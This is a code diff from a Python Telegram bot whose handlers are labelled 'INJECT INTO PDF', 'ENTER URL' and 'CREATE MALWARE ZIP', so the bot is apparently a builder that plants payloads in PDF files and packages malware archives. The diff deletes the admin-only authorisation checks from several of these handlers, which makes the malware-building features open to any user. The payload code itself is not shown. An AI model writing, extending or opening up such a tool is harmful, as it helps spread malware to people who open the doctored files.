@@ -409,9 +409,7 @@ exit
 # ==================== TELEGRAM BOT HANDLERS ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    if message.from_user.id != ADMIN_USER_ID:
-        bot.send_message(message.chat.id, "❌ Unauthorized.")
-        return
+   
     
     # Reset user state
     user_id = message.from_user.id
@@ -444,8 +442,7 @@ def start_command(message):
 
 @bot.message_handler(func=lambda message: message.text == '📄 INJECT INTO PDF')
 def inject_pdf_button(message):
-    if message.from_user.id != ADMIN_USER_ID:
-        return
+    
     
     user_id = message.from_user.id
     user_states[user_id] = 'waiting_for_pdf'
@@ -529,8 +526,7 @@ def handle_pdf_upload(message):
 
 @bot.message_handler(func=lambda message: message.text == '🔗 ENTER URL')
 def enter_url_button(message):
-    if message.from_user.id != ADMIN_USER_ID:
-        return
+    
     
     user_id = message.from_user.id
     
@@ -706,8 +702,7 @@ def process_payload_type(message):
 
 @bot.message_handler(func=lambda message: message.text == '📦 CREATE MALWARE ZIP')
 def create_malware_zip_button(message):
-    if message.from_user.id != ADMIN_USER_ID:
-        return
+    
     
     # Ask for malware type
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
